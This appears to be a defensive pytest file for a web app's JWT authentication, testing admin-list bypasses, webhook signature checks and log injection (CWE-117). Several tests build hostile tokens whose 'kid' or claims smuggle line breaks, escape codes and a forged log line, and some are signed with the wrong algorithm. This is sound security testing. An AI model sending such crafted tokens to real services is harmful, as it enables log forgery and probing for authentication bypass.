def test_the_bootstrap_list_does_not_open_a_door_for_a_stranger(web, bd_db, monkeypatch):
    """BD_ADMIN_EMAILS creates its OWN people on first sign-in, nobody else: a near-miss of a listed
    address is still a 403, and a +tag of it too."""
    monkeypatch.setattr(bd_config, "BD_ADMIN_EMAILS", frozenset({"boss@example.com"}))
    for email in ("boss+x@example.com", "b0ss@example.com", "bos@example.com"):
        envelope(call(web, rs256(claims(email=email))), 403, "forbidden", bd_auth.NO_BD_ROLE)
    assert bd_db.execute("select count(*) as n from bd.users where email like 'b%ss%'").fetchone()["n"] == 0


# ── the telephony webhook (public to the gate; proves itself with the provider's signature) ───
def test_the_webhook_is_public_to_the_gate_but_never_accepts_an_unsigned_call(web):
    """No user token is needed (the provider has none), but an unsigned call is never a 2xx and never
    a 500, whether the route is the placeholder or, later, the real handler."""
    for body in ({}, {"type": "call.completed"}, {"data": {"phone": "816-555-0100"}}):
        r = web.post(pending.WEBHOOK_PATH, json=body)
        assert r.json()["ok"] is False, r.text
        assert r.status_code in (400, 401, 403, 409, 422, 503), r.text      # never the 500 of a crash
    # A user token is no substitute for the signature.
    r = web.post(pending.WEBHOOK_PATH, json={"type": "call.completed"}, headers={"Authorization": rs256(claims())})
    assert r.json().get("ok") is not True


def test_the_webhook_prefix_alone_is_not_public(web):
    for path in ("/api/bd/webhooks/telephony/", "/api/bd/webhooks/telephony", "/api/bd/webhooks/",
                 "/api/bd/webhooks/other/quo", "/api/webhooks/telephony/quo"):
        r = web.post(path, json={})
        assert r.status_code == 401, (path, r.status_code, r.text[:200])
        assert r.json().get("ok") is not True


# ── nothing in the verifier is order-dependent ───────────────────────────────────────────────
def test_a_refusal_does_not_poison_the_next_good_request(web):
    for _ in range(3):
        refused_401(web, rs256(claims(exp=NOW() - 60)))
        assert call(web, rs256(claims())).status_code == 200
        refused_401(web, "Bearer " + "A" * 5000)
        assert call(web, es256(claims())).status_code == 200


# ── the log is not forgeable through a token (CWE-117) ───────────────────────────────────────
FORGED = "INFO proposal_tool.auth: token accepted for emery.stoll@example.com"


@pytest.mark.parametrize("breaker", ["\n", "\r\n", "\r", "\u2028", "\x1b[2J", "\x00", "\x0b\x0c"],
                         ids=["LF", "CRLF", "CR", "U+2028", "ESC", "NUL", "VT-FF"])
def test_a_hostile_kid_cannot_forge_a_log_line(monkeypatch, caplog, breaker):
    """A rejection is logged with the library's reason, which can carry what the caller sent. A line
    break in it must not become a line break in the log, or an unauthenticated caller writes records
    into `docker logs`."""
    import logging

    configure_real_jwks(monkeypatch)
    kid = "x" + breaker + "2026-11-10 00:00:00,000 " + FORGED
    for token in (forge({"alg": "RS256", "kid": kid, "typ": "JWT"}, claims(), sign_with=("RS256", RSA_KEY)),
                  forge({"alg": "HS256", "kid": kid, "typ": "JWT"}, claims(), sign_with=("HS256", WRONG_HS.encode()))):
        caplog.clear()
        caplog.set_level(logging.INFO, logger="proposal_tool.auth")
        with pytest.raises(supabase_client.AuthError):
            supabase_client.verify_token_claims(token)
        rejected = [r for r in caplog.records if r.getMessage().startswith("token rejected")]
        assert rejected, "the rejection is logged (otherwise this test proves nothing)"
        for record in caplog.records:
            line = record.getMessage()
            assert len(line.splitlines()) == 1, "a caller made one log record into several lines: %r" % line
            assert not any(c in line for c in "\r\n\x00\x1b\u2028\u2029\x0b\x0c"), repr(line)


def test_the_other_rejections_log_one_line_too(monkeypatch, caplog):
    """The issuer, provider and domain rejections are made from values inside the token: whatever is
    logged for them stays one line however the token spells them."""
    import logging

    caplog.set_level(logging.INFO, logger="proposal_tool.auth")
    bad = "evil\nINFO proposal_tool.auth: forged"
    for over in ({"iss": bad}, {"app_metadata": {"provider": bad, "providers": [bad]}},
                 {"email": "a@" + bad}, {"app_metadata": {"provider": bad}, "amr": [{"method": bad}]}):
        with pytest.raises(supabase_client.AuthError):
            supabase_client.verify_token_claims(rs256(claims(**over)))
    for record in caplog.records:
        assert "\n" not in record.getMessage(), repr(record.getMessage())
